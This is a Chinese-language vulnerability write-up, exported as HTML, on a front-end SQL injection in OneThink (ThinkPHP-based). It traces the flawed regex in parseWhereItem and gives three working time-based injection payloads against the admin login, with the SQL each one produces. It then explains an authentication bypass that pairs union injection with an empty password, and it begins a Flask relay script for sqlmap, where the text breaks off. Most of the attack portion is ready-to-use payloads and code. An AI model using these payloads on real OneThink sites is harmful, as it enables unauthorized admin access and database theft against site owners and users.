<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="onethink-前台注入"><span class="csDE05BCC">OneThink </span><span class="csECDA2D3">前台注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">OneThink &lt; 1.1.141212</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">以</span><span class="cs9FB05234">OneThink 1.0.131218</span><span class="cs9C1B1871">为例，本地搭建起</span><span class="cs9FB05234">one.think</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="393" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">打开源码文件夹，好家伙，踏破铁鞋无觅处，得来全不费工夫</span><span class="cs8926E06">&mdash;&mdash;thinkphp3.2.3</span><span class="cs9C1B1871">的框架，那岂不是，</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">咱们一起回顾下它</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入时参数的传递过程</span></p><p class="cs3A447A38"><span class="cs9FB05234"># \OneThink\ThinkPHP\Library\Think\Model.class.php #1576L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> public function where($where,$parse=null){//$where=array(&quot;username&quot;=&gt;&quot;xxx&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;... &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($this-&gt;options[&#39;where&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;options[&#39;where&#39;] = &nbsp;&nbsp;array_merge($this-&gt;options[&#39;where&#39;],$where);//</span><span class="cs7FFD2630">从左到右，合并数组到</span><span class="cs9FB05234">options</span><span class="cs7FFD2630">中</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;options[&#39;where&#39;] = &nbsp;&nbsp;$where;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $this;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上边简单进行了数组合并，再跟进</span><span class="cs9FB05234">find()</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">将</span><span class="cs9FB05234">$option</span><span class="cs9C1B1871">变量传入</span><span class="cs9FB05234">$this-&gt;db</span><span class="cs9C1B1871">对象的</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">函数，</span></p><p class="cs3A447A38"><span class="cs9FB05234"># \OneThink\ThinkPHP\Library\Think\Model.class.php #624L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> public function find($options=array()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$resultSet &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;$this-&gt;db-&gt;select($options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">函数，关注到它的里面使用到了</span><span class="cs9FB05234">buildSelectSql</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="142" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$options</span><span class="cs9C1B1871">变量的学问就在其中，</span></p><p class="cs3A447A38"><span class="cs9FB05234"># \OneThink\ThinkPHP\Library\Think\Db.class.php # 804L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">protected $selectSql &nbsp;= &#39;SELECT%DISTINCT% %FIELD% FROM %TABLE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%COMMENT%&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function buildSelectSql($options=array()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(isset($options[&#39;page&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">根据页数计算</span><span class="cs9FB05234">limit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$sql &nbsp;= &nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;parseSql($this-&gt;selectSql,$options);/*</span><span class="cs7FFD2630">关键</span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个</span><span class="cs9FB05234">parseSql</span><span class="cs9C1B1871">里面，起到注入作用，最重要的就是</span><span class="cs9FB05234">parseWhere</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image2.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs9FB05234">parseWhere</span><span class="cs9C1B1871">方法，</span><span class="cs8926E06">425</span><span class="cs9C1B1871">行将</span><span class="cs9FB05234">$where</span><span class="cs9C1B1871">拆成</span><span class="cs9FB05234">$``key</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">$``val</span><span class="cs9C1B1871">，在后面几个地方传入</span><span class="cs9FB05234">parseWhereItem()</span><span class="cs9C1B1871">，</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">parseKey</span><span class="cs9C1B1871">是一个取值方法，没实际意义</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="207" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">下面就是注入发生的地方了，好好分析一下这个</span><span class="cs9FB05234">parseWhereItem()</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="262" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先，</span><span class="cs9FB05234">$val</span><span class="cs9C1B1871">来源于上面的</span><span class="cs9FB05234">$where</span><span class="cs9C1B1871">变量，是咱们可控的；</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">其次，这里正则判断有大问题，没有使用</span><span class="cs9FB05234">^</span><span class="cs8926E06"> </span><span class="cs9FB05234">$</span><span class="cs9C1B1871">来定界，导致</span><span class="cs9FB05234">xxINxx</span><span class="cs9C1B1871">这种形式也能通过判断，</span><span class="cs9FB05234">val[0]</span><span class="cs9C1B1871">在</span><span class="cs9FB05234">IN</span><span class="cs9C1B1871">后面实际可构造出任意内容，后续进行了拼接，导致</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入。</span></p><p class="cs3A447A38"><span class="cs9FB05234"># \OneThink\ThinkPHP\Library\Think\Db.class.php #469L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">protected function parseWhereItem($key,$val) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;$whereStr = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;elseif(preg_match(&#39;/IN/i&#39;,$val[0])){ // IN </span><span class="cs7FFD2630">运算</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if(isset($val[2]) &amp;&amp; &#39;exp&#39;==$val[2]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$whereStr .= $key.&#39; &#39;.strtoupper($val[0]).&#39; &#39;.$val[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_string($val[1])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$val[1] = &nbsp;explode(&#39;,&#39;,$val[1]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$zone &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;implode(&#39;,&#39;,$this-&gt;parseValue($val[1]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$whereStr .= $key.&#39; &#39;.strtoupper($val[0]).&#39; (&#39;.$zone.&#39;)&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}elseif(preg_match(&#39;/BETWEEN/i&#39;,$val[0])){ // BETWEEN</span><span class="cs7FFD2630">运算</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = is_string($val[1])? explode(&#39;,&#39;,$val[1]):$val[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$whereStr .= &nbsp;&#39; (&#39;.$key.&#39; &#39;.strtoupper($val[0]).&#39; &#39;.$this-&gt;parseValue($data[0]).&#39; AND &#39;.$this-&gt;parseValue($data[1]).&#39; )&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么确定存在注入问题，这里咱们看看前台登录地址处，具体怎么注入</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">payload1-in</span><span class="csE3F655E4">注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">username[]=in (&#39;&#39;)) and (select 1 from (select sleep(4))x)--+-&amp;password=2&amp;verify=0x401</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="76" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">实际执行</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT * FROM `onethink_ucenter_member` WHERE ( `username` </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">IN (&#39;&#39;)) &nbsp;AND (SELECT 1 FROM (SELECT SLEEP(4))X)-- - () ) LIMIT 1</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">payload2-exp</span><span class="csE3F655E4">注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">username[0]=exp&amp;username[1]=&gt;(select 1 from (select sleep(3))x)&amp;password=2&amp;verify=0x401</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image7.png" width="560" height="68" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">实际执行</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT * FROM `onethink_ucenter_member` WHERE ( &nbsp;(`username` </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&gt; (select 1 from (select sleep(3))x)) &nbsp;)</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">payload3-between</span><span class="csE3F655E4">注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">username[0]=BETWEEN 1 and ( select 1 from (select sleep(2))x)))--+-&amp;username[1]=&amp;password=2&amp;verify=0x401</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image8.png" width="560" height="73" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT * FROM `onethink_ucenter_member` WHERE ( &nbsp;(`username` </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BETWEEN 1 AND ( SELECT 1 FROM (SELECT SLEEP(2))X)))-- - &#39;&#39; AND null ) ) LIMIT 1</span></p><p class="cs40DD2BC9"><span class="cs8926E06">ok</span><span class="cs9C1B1871">，现在有了注入，我们就能使用联合查询，来绕过后台用户登录，实现</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">万能密码</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">的效果。但在这之前，还需要分析完整的登录逻辑。</span></p><h2 class="cs868C439D">
			<a name="登录逻辑分析"><span class="cs83F14626">登录逻辑分析</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/FileMonitor"><span class="cs4B51D5E4">FileMonitor</span></a></span><span class="cs9C1B1871">工具，得到后台登录处的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT * FROM `onethink_ucenter_member` WHERE ( `username` = &#39;1&#39; ) LIMIT 1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而数据表</span><span class="cs9FB05234">onethink_ucenter_member</span><span class="cs9C1B1871">的结构如下图，有</span><span class="cs8926E06">11</span><span class="cs9C1B1871">列，那么联合注入就需要构造</span><span class="cs8926E06">11</span><span class="cs9C1B1871">个参数</span><span class="cs9FB05234">union select 1,2,3,4,...,11</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image9.png" width="560" height="53" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着发现登录处的链接为</span><span class="cs9FB05234">http://www.0-sec.org/index.php?s=/admin/public/login.html</span><span class="cs9C1B1871">，跟入源码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image10.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234"># OneThink\Application\Admin\Controller\PublicController.class.php : 31L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function login($username = null, $password = null, $verify = null){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> $User = new UserApi;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$uid = $User-&gt;login($username, $password);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs9FB05234">UcenterMemberModel</span><span class="cs9C1B1871">类，进入</span><span class="cs9FB05234">login</span><span class="cs9C1B1871">函数</span></p><p class="cs3A447A38"><span class="cs9FB05234"># /OneThink/Application/User/Api/UserApi.class.php &nbsp;#42L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;protected function _init(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;model = new UcenterMemberModel(); &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">初始化</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function login($username, $password, $type = 1){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $this-&gt;model-&gt;login($username, $password, $type);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟进，发现登录的关键逻辑</span></p><p class="cs3A447A38"><span class="cs9FB05234"># /OneThink/Application/User/Model/UcenterMemberModel.class.php #148L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/* </span><span class="cs7FFD2630">获取用户数据</span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function login($username, $password, $type = 1){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$map = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;switch ($type) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$map[&#39;username&#39;] = $username; //</span><span class="cs7FFD2630">【给</span><span class="cs9FB05234">map</span><span class="cs7FFD2630">数组赋值】</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/* </span><span class="cs7FFD2630">获取用户数据</span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$user = $this-&gt;where($map)-&gt;find(); //</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">1 </span><span class="cs7FFD2630">用户名验证】</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(is_array($user) &amp;&amp; $user[&#39;status&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;/* </span><span class="cs7FFD2630">验证用户密码</span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(think_ucenter_md5($password, UC_AUTH_KEY) === $user[&#39;password&#39;]){</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">2 </span><span class="cs7FFD2630">密码验证】</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;updateLogin($user[&#39;id&#39;]); //</span><span class="cs7FFD2630">更新用户登录信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $user[&#39;id&#39;]; //</span><span class="cs7FFD2630">登录成功，返回用户</span><span class="cs9FB05234">ID</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -2; //</span><span class="cs7FFD2630">密码错误</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return -1; //</span><span class="cs7FFD2630">用户不存在或被禁用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">整理知道：一个用户要成功登录，得过两道坎：</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="csE3F655E4">用户名验证</span><span class="cs9C1B1871">。即要通过</span><span class="cs9FB05234">$username</span><span class="cs9C1B1871">的验证，并使得查询出的</span><span class="cs9FB05234">$user[&#39;status&#39;]</span><span class="cs9C1B1871">大于零，所以关注</span><span class="cs9FB05234">$user = $this-&gt;where($map)-&gt;find()</span><span class="cs9C1B1871">这一条，跟进</span><span class="cs9FB05234">where()</span><span class="cs9C1B1871">方法，追到</span><span class="cs9FB05234">\ThinkPHP</span><span class="cs9C1B1871">文件夹下了，这是注入点。</span></li><li class="cs24C36B3"><span class="csE3F655E4">密码验证</span><span class="cs9C1B1871">。即还要使得</span><span class="cs9FB05234">think_ucenter_md5($password, UC_AUTH_KEY)</span><span class="cs9C1B1871">等于查询出的</span><span class="cs9FB05234">$user[&#39;password&#39;]</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">$password</span><span class="cs9C1B1871">其实就是咱们登陆时输入的密码，我们跟进</span><span class="cs9FB05234">think_ucenter_md</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234"># \OneThink\Application\User\Common\common.php #15L</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function think_ucenter_md5($str, $key = &#39;ThinkUCenter&#39;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> return &#39;&#39; === $str ? &#39;&#39; : md5(sha1($str) . $key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">得出结论：</span><span class="csE3F655E4">如果输入值为空值，那么加密函数返回的结果也为空值</span><span class="cs8926E06">&mdash;&mdash;</span><span class="cs9C1B1871">舒服了，根本不必用到</span><span class="cs8926E06">hash</span><span class="cs9C1B1871">计算嘛！所以密码验证这一步也搞定了，只需要让</span><span class="cs8926E06">POST</span><span class="cs9C1B1871">上去的密码为空即可！</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image11.png" width="560" height="218" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image12.png" width="560" height="21" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">网络不是不法之地。虽然已经可以进后台了，但依然不知道管理员的账号密码，有一些登录界面没有验证码，所以这里再提供一种对接</span><span class="cs8926E06">SQLMAP</span><span class="cs9C1B1871">的思路（非改</span><span class="cs8926E06">tamper</span><span class="cs9C1B1871">），供大家参考</span></p><h3 class="cs868C439D">
			<a name="对接sqlmapflask参数转发"><span class="csD6CA00D2">对接</span><span class="csD1E291E2">sqlmap</span><span class="csD6CA00D2">：</span><span class="csD1E291E2">Flask</span><span class="csD6CA00D2">参数转发</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先注入点位置如下图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OneThink/OneThink%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image13.png" width="560" height="169" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234"># encoding: utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># sqli-reverse-flask.py</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from flask import Flask,request,jsonify</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def remote_login(payload):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">对服务器发起访问请求</span><span 